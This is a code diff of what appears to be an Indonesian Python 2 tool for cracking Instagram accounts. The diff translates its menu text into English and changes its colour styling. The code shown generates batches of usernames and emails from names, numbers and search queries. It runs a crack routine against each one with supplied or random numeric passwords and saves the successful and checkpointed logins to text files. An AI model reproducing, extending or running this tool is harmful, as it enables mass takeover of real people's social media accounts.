@@ -35,7 +35,7 @@ def menu_instagram():
 	try:
                 token=open('___bangsat___','r').read()
         except IOError:
-                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid')
+                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Token Invalid')
                 time.sleep(2)
                 login()
 	try:
@@ -43,31 +43,31 @@ def menu_instagram():
                 a = json.loads(otw.text)
 		nama = a['name']
 	except KeyError:
-		print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid")
+		print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Token Invalid")
 		os.system('rm -rf ___bangsat___')
 		time.sleep(2)
 		login()
 	os.system("clear")
 	print(logo)
 	print("\x1b[1;92m╔══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Ip     : "+ip)
-	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Nama   : "+nama)
+	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Name   : "+nama)
 	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Region : "+region)
 	print("\x1b[1;92m║")
-	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m1\x1b[1;92m]\x1b[1;97m Crack Dari Username Huruf+Angka")
-	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m2\x1b[1;92m]\x1b[1;97m Crack Dari Username Huruf_Angka")
-	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m3\x1b[1;92m]\x1b[1;97m Crack Dari Email Nama+Angka")
-	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m4\x1b[1;92m]\x1b[1;97m Crack Dari Email Huruf")
-	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m5\x1b[1;92m]\x1b[1;97m Crack Dari Email Angka")
-	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m6\x1b[1;92m]\x1b[1;97m Crack Dari Query V1")
-	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m7\x1b[1;92m]\x1b[1;97m Crack Dari Query V2")
-	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m8\x1b[1;92m]\x1b[1;97m Lihat Hasil Crack")
-	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m0\x1b[1;92m]\x1b[1;91m Keluar")
+	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m1\x1b[1;92m]\x1b[1;97m Crack From Username Letter+Number")
+	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m2\x1b[1;92m]\x1b[1;97m Crack From Username Letter_Number")
+	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m3\x1b[1;92m]\x1b[1;97m Crack From Email Letter+Number")
+	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m4\x1b[1;92m]\x1b[1;97m Crack From Email Letter")
+	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m5\x1b[1;92m]\x1b[1;97m Crack From Email Number")
+	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m6\x1b[1;92m]\x1b[1;97m Crack From Query V1")
+	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m7\x1b[1;92m]\x1b[1;97m Crack From Query V2")
+	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m8\x1b[1;92m]\x1b[1;97m View Crack Results")
+	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m0\x1b[1;92m]\x1b[1;91m Go Out")
 	print("\x1b[1;92m║")
 	menu=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Choose :\x1b[1;92m ")
 	if menu == "":
 		exit("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Wrong Input")
 	elif menu == "1":
-		nama=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Nama :\x1b[1;92m ").lower()
+		nama=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Name :\x1b[1;92m ").lower()
                 pw=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Password :\x1b[1;92m ")
                 print("\x1b[1;97m ")
                 for i in range(1000):
@@ -75,7 +75,7 @@ def menu_instagram():
                         user=(nama+str(number))
 			crack(user,pw)
 	elif menu == "2":
-                nama=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Nama :\x1b[1;92m ").replace(" ","_")
+                nama=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Name :\x1b[1;92m ").replace(" ","_")
                 pw=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Password :\x1b[1;92m ")
                 print("\x1b[1;97m ")
                 for i in range(100):
@@ -83,8 +83,8 @@ def menu_instagram():
                         user=(nama+"_"+str(number))
                         crack(user,pw)
 	elif menu == "3":
-		nama=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Nama :\x1b[1;92m ").lower()
-                tipe=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Tipe Email :\x1b[1;92m ")
+		nama=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Name :\x1b[1;92m ").lower()
+                tipe=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Email Type :\x1b[1;92m ")
                 pw=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Password :\x1b[1;92m ")
                 print("\x1b[1;97m ")
                 for i in range(1000):
@@ -92,7 +92,7 @@ def menu_instagram():
                         email=(nama+str(number)+tipe)
                         crack(email,pw)
 	elif menu == "4":
-                tipe=raw_input("\x1b[1;96m[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Tipe Email :\x1b[1;96m ")
+                tipe=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Email Type :\x1b[1;92m ")
                 print("\x1b[1;97m ")
                 for i in range(1500):
                         low = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
@@ -120,7 +120,7 @@ def menu_instagram():
                         crack(email,pw)
 	elif menu == "5":
 		domain=("@gmail.com")
-                print("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Tipe Email :\x1b[1;96m "+domain)
+                print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Email Type :\x1b[1;92m "+domain)
                 print("\x1b[1;97m ")
                 for i in range(1500):
                         number=random.randint(111111, 999999)
@@ -128,30 +128,31 @@ def menu_instagram():
                         pw=(str(number))
                         crack(em_angka,pw)
 	elif menu == "6":
-		nama=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Query :\x1b[1;96m ").lower()
-                pw=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Password :\x1b[1;96m ")
+		nama=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Query :\x1b[1;92m ").lower()
+                pw=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Password :\x1b[1;92m ")
                 print("\x1b[1;97m ")
                 query().getquery(nama,pw)
 	elif menu == "7":
 		query_v2()
 	elif menu == "8":
-		print("\x1b[1;96m[\x1b[1;97m1\x1b[1;96m]\x1b[1;97m Lihat Hasil\x1b[1;92m Ok")
-                print("\x1b[1;96m[\x1b[1;97m2\x1b[1;96m] Lihat Hasil\x1b[1;93m Cp")
-                print("\x1b[1;97m[\x1b[1;93m0\x1b[1;97m]\x1b[1;93m Kembali")
-                lihat = raw_input("\n\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Choose :\x1b[1;96m ")
+		print("\x1b[1;92m╠══◍➤®[\x1b[1;97m1\x1b[1;92m]\x1b[1;97m View Results\x1b[1;92m Ok")
+                print("\x1b[1;92m╠══◍➤®[\x1b[1;97m2\x1b[1;92m]\x1b[1;97m View Results\x1b[1;93m Cp")
+                print("\x1b[1;92m╠══◍➤®[\x1b[1;97m0\x1b[1;92m]\x1b[1;97m Kembali")
+	        print("\x1b[1;92m║")
+                lihat = raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Choose :\x1b[1;92m ")
                 if lihat == "":
-                        exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
+                        exit("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Wrong Input")
                 elif lihat == "1":
                         try:
                                 ok=open('Insta_Ok.txt','r').read()
                         except IOError:
-                                exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Hasil Ok Tidak Ada")
+                                exit("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Hasil Ok Tidak Ada")
                         print("\x1b[1;92m"+ok)
                 elif lihat == "2":
                         try:
                                 cp=open('Insta_Cp.txt','r').read()
                         except IOError:
-                                exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Hasil Cp Tidak Ada")
+                                exit("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Hasil Cp Tidak Ada")
                         print("\x1b[1;93m"+cp)
                 elif lihat == "0":
                         menu_instagram()
@@ -234,9 +235,9 @@ head = {
 }
 def query_v2():
         try:
-                query=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Query :\x1b[1;96m ").lower()
-		limit=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Limit :\x1b[1;96m ")
-                pw=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Password :\x1b[1;96m ")
+                query=raw_input("\x1b[1;96m[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Query :\x1b[1;96m ").lower()
+		limit=raw_input("\x1b[1;96m[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Limit :\x1b[1;96m ")
+                pw=raw_input("\x1b[1;96m[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Password :\x1b[1;96m ")
 		print("\x1b[1;97m ")
 		ruks = requests.Session()
                 url_id = 'https://www.instagram.com/web/search/topsearch/?context=blended&query=25.'+query
